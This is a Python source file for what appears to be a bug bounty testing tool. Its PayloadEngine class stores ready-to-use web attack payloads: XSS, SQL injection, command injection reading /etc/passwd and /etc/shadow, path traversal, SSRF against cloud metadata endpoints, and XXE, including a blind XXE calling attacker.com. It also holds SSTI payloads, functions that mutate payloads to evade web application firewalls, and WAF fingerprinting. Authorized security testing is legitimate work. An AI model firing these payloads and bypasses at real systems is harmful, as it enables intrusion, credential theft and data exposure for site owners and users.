"""
Intelligent Payload Engine for Bug Bounty Testing
Context-aware payload generation with WAF bypass capabilities
"""

import re
from typing import List, Dict, Optional, Set
from enum import Enum
import base64
import urllib.parse

from src.utils.logger import get_logger

logger = get_logger(__name__)


class PayloadCategory(str, Enum):
    """Payload categories"""
    XSS = "xss"
    SQLI = "sqli"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    SSRF = "ssrf"
    XXE = "xxe"
    IDOR = "idor"
    SSTI = "ssti"


class PayloadEngine:
    """
    Advanced payload engine with context awareness and WAF bypass techniques
    """
    
    def __init__(self):
        """Initialize payload engine"""
        self.payload_database = self._init_payload_database()
        self.encoding_techniques = self._init_encoding_techniques()
        self.waf_fingerprints = {}
    
    def _init_payload_database(self) -> Dict[str, List[str]]:
        """Initialize comprehensive payload database"""
        return {
            PayloadCategory.XSS: [
                # Basic XSS
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                
                # DOM-based XSS
                "javascript:alert('XSS')",
                "'-alert('XSS')-'",
                "\"><script>alert('XSS')</script>",
                
                # Event handler XSS
                "<body onload=alert('XSS')>",
                "<input autofocus onfocus=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                
                # Advanced XSS
                "<iframe src=javascript:alert('XSS')>",
                "<object data=javascript:alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
                
                # WAF bypass XSS
                "<sCrIpT>alert('XSS')</ScRiPt>",
                "<script\x00>alert('XSS')</script>",
                "<script>ale\\u0072t('XSS')</script>",
                "<svg/onload=alert('XSS')>",
                "<img src=x onerror=\\u0061lert('XSS')>",
                
                # Polyglot XSS
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>/",
                
                # HTML5 XSS
                "<video src=x onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
            ],
            
            PayloadCategory.SQLI: [
                # Basic SQL injection
                "' OR '1'='1",
                "' OR 1=1--",
                "admin' --",
                "' OR '1'='1' /*",
                
                # Union-based SQLi
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                
                # Blind SQLi
                "' AND SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND '1'='1",
                "' AND '1'='2",
                
                # Error-based SQLi
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' AND extractvalue(1,concat(0x7e,version()))--",
                
                # WAF bypass SQLi
                "' /*!50000OR*/ '1'='1",
                "' %23%0AOR%23%0A'1'='1",
                "' UNION/**_**/SELECT/**_**/NULL--",
                "' UnIoN SeLeCt NuLl--",
            ],
            
            PayloadCategory.COMMAND_INJECTION: [
                # Basic command injection
                "; ls",
                "| whoami",
                "& dir",
                "`id`",
                "$(whoami)",
                
                # Chained commands
                "; cat /etc/passwd",
                "| cat /etc/shadow",
                "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                
                # Blind command injection
                "; ping -c 10 attacker.com",
                "| sleep 10",
                "& timeout /t 10",
                
                # WAF bypass
                ";%20ls",
                "|%20whoami",
                ";${IFS}cat${IFS}/etc/passwd",
            ],
            
            PayloadCategory.PATH_TRAVERSAL: [
                # Basic path traversal
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                
                # Encoded traversal
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                
                # Double encoding
                "..%252f..%252f..%252fetc%252fpasswd",
            ],
            
            PayloadCategory.SSRF: [
                # Basic SSRF
                "http://localhost",
                "http://127.0.0.1",
                "http://0.0.0.0",
                "http://[::1]",
                
                # Cloud metadata endpoints
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                
                # Bypasses
                "http://127.1",
                "http://2130706433",  # Decimal IP
                "http://0177.0.0.1",  # Octal IP
            ],
            
            PayloadCategory.XXE: [
                # Basic XXE
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                
                # Blind XXE
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>test</foo>',
            ],
            
            PayloadCategory.SSTI: [
                # Jinja2/Flask
                "{{7*7}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                
                # Twig
                "{{7*'7'}}",
                "{{_self.env.getRuntime('Twig\\\\Runtime\\\\EscaperRuntime')}}",
                
                # ERB/Ruby
                "<%= 7*7 %>",
                "<%= `whoami` %>",
            ]
        }
    
    def _init_encoding_techniques(self) -> Dict[str, callable]:
        """Initialize encoding techniques for WAF bypass"""
        return {
            "url_encode": lambda p: urllib.parse.quote(p),
            "double_url_encode": lambda p: urllib.parse.quote(urllib.parse.quote(p)),
            "base64": lambda p: base64.b64encode(p.encode()).decode(),
            "hex_encode": lambda p: ''.join([f'\\x{ord(c):02x}' for c in p]),
            "unicode_encode": lambda p: ''.join([f'\\u{ord(c):04x}' for c in p]),
            "html_encode": lambda p: ''.join([f'&#{ord(c)};' for c in p]),
            "case_swap": lambda p: ''.join([c.upper() if i % 2 else c.lower() for i, c in enumerate(p)]),
        }
    
    def generate_payloads(
        self,
        category: PayloadCategory,
        context: Optional[str] = None,
        include_encoded: bool = True,
        max_payloads: int = 20
    ) -> List[Dict[str, str]]:
        """
        Generate context-aware payloads
        
        Args:
            category: Payload category (XSS, SQLi, etc.)
            context: Context hints (e.g., "inside_quotes", "html_attribute")
            include_encoded: Include encoded variants
            max_payloads: Maximum number of payloads to generate
        
        Returns:
            List of payload dictionaries with metadata
        """
        payloads = []
        base_payloads = self.payload_database.get(category, [])
        
        for base_payload in base_payloads[:max_payloads]:
            payloads.append({
                "payload": base_payload,
                "encoding": "none",
                "category": category,
                "context": context or "unknown"
            })
            
            if include_encoded and len(payloads) < max_payloads:
                encoded_variants = self._generate_encoded_variants(base_payload, max_variants=2)
                for variant in encoded_variants:
                    if len(payloads) >= max_payloads:
                        break
                    payloads.append({
                        "payload": variant["payload"],
                        "encoding": variant["encoding"],
                        "category": category,
                        "context": context or "unknown"
                    })
        
        logger.info(f"Generated {len(payloads)} payloads for {category}")
        return payloads[:max_payloads]
    
    def _generate_encoded_variants(self, payload: str, max_variants: int = 3) -> List[Dict]:
        """Generate encoded variants of a payload"""
        variants = []
        
        encoding_methods = [
            "url_encode",
            "double_url_encode",
            "case_swap",
            "unicode_encode"
        ]
        
        for method in encoding_methods[:max_variants]:
            try:
                encoder = self.encoding_techniques[method]
                encoded = encoder(payload)
                variants.append({
                    "payload": encoded,
                    "encoding": method
                })
            except Exception as e:
                logger.warning(f"Failed to encode with {method}: {e}")
        
        return variants
    
    def detect_waf(self, response_headers: Dict[str, str], response_body: str) -> Dict[str, any]:
        """
        Detect Web Application Firewall based on response
        
        Args:
            response_headers: HTTP response headers
            response_body: HTTP response body
        
        Returns:
            WAF detection results
        """
        waf_signatures = {
            "Cloudflare": {
                "headers": ["cf-ray", "cf-request-id"],
                "body_patterns": ["cloudflare", "ray id"]
            },
            "AWS WAF": {
                "headers": ["x-amzn-requestid"],
                "body_patterns": ["aws waf", "request blocked"]
            },
            "Akamai": {
                "headers": ["x-akamai-request-id"],
                "body_patterns": ["akamai"]
            },
            "Imperva": {
                "headers": ["x-iinfo"],
                "body_patterns": ["imperva", "incapsula"]
            },
            "ModSecurity": {
                "headers": [],
                "body_patterns": ["mod_security", "modsecurity"]
            },
            "Sucuri": {
                "headers": ["x-sucuri-id"],
                "body_patterns": ["sucuri"]
            }
        }
        
        detected_wafs = []
        
        for waf_name, signatures in waf_signatures.items():
            score = 0
            
            for header in signatures["headers"]:
                if header.lower() in [h.lower() for h in response_headers.keys()]:
                    score += 2
            
            for pattern in signatures["body_patterns"]:
                if re.search(pattern, response_body, re.IGNORECASE):
                    score += 1
            
            if score > 0:
                detected_wafs.append({
                    "name": waf_name,
                    "confidence": min(score / 3, 1.0)
                })
        
        result = {
            "waf_detected": len(detected_wafs) > 0,
            "wafs": detected_wafs
        }
        
        if detected_wafs:
            logger.info(f"Detected WAF: {[w['name'] for w in detected_wafs]}")
        
        return result
    
    def generate_waf_bypass_payloads(
        self,
        category: PayloadCategory,
        waf_name: Optional[str] = None,
        max_payloads: int = 10
    ) -> List[Dict[str, str]]:
        """
        Generate WAF-specific bypass payloads
        
        Args:
            category: Payload category
            waf_name: Detected WAF name (optional)
            max_payloads: Maximum payloads to generate
        
        Returns:
            List of WAF bypass payloads
        """
        base_payloads = self.generate_payloads(
            category,
            include_encoded=True,
            max_payloads=max_payloads
        )
        
        bypass_payloads = []
        
        for payload_dict in base_payloads:
            original = payload_dict["payload"]
            
            bypass_variants = [
                self._add_null_bytes(original),
                self._add_comments(original, category),
                self._case_variation(original),
                self._add_line_breaks(original)
            ]
            
            for variant in bypass_variants:
                if variant and len(bypass_payloads) < max_payloads:
                    bypass_payloads.append({
                        "payload": variant,
                        "encoding": "waf_bypass",
                        "category": category,
                        "waf_target": waf_name or "generic"
                    })
        
        logger.info(f"Generated {len(bypass_payloads)} WAF bypass payloads")
        return bypass_payloads[:max_payloads]
    
    def _add_null_bytes(self, payload: str) -> str:
        """Add null bytes for WAF bypass"""
        return payload.replace("<", "<\x00").replace(">", "\x00>")
    
    def _add_comments(self, payload: str, category: PayloadCategory) -> str:
        """Add comments for WAF bypass"""
        if category == PayloadCategory.XSS:
            return payload.replace("<script>", "<script/**/type/**/=/**/text/javascript>")
        elif category == PayloadCategory.SQLI:
            return payload.replace("OR", "/*!50000OR*/").replace("AND", "/*!50000AND*/")
        return payload
    
    def _case_variation(self, payload: str) -> str:
        """Vary case for WAF bypass"""
        result = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                result += char.upper() if i % 2 == 0 else char.lower()
            else:
                result += char
        return result
    
    def _add_line_breaks(self, payload: str) -> str:
        """Add line breaks/newlines for WAF bypass"""
        return payload.replace(" ", "%0A").replace("><", ">%0D%0A<")
    
    def analyze_reflection(self, payload: str, response_body: str) -> Dict[str, any]:
        """
        Analyze if payload is reflected in response
        
        Args:
            payload: Original payload
            response_body: HTTP response body
        
        Returns:
            Reflection analysis
        """
        reflected = payload in response_body
        
        if not reflected:
            encoded_variants = [
                urllib.parse.quote(payload),
                payload.replace("<", "&lt;").replace(">", "&gt;"),
                payload.replace("'", "&#39;").replace('"', "&quot;")
            ]
            
            for variant in encoded_variants:
                if variant in response_body:
                    reflected = True
                    break
        
        reflection_contexts = []
        if reflected:
            if re.search(r'<script[^>]*>' + re.escape(payload), response_body):
                reflection_contexts.append("inside_script")
            if re.search(r'<[^>]*' + re.escape(payload) + r'[^>]*>', response_body):
                reflection_contexts.append("inside_html_tag")
            if re.search(r'onclick=["\']?[^"\']*' + re.escape(payload), response_body):
                reflection_contexts.append("inside_event_handler")
        
        return {
            "reflected": reflected,
            "contexts": reflection_contexts,
            "payload": payload
        }


_payload_engine: Optional[PayloadEngine] = None


def get_payload_engine() -> PayloadEngine:
    """Get or create payload engine singleton"""
    global _payload_engine
    if _payload_engine is None:
        _payload_engine = PayloadEngine()
    return _payload_engine
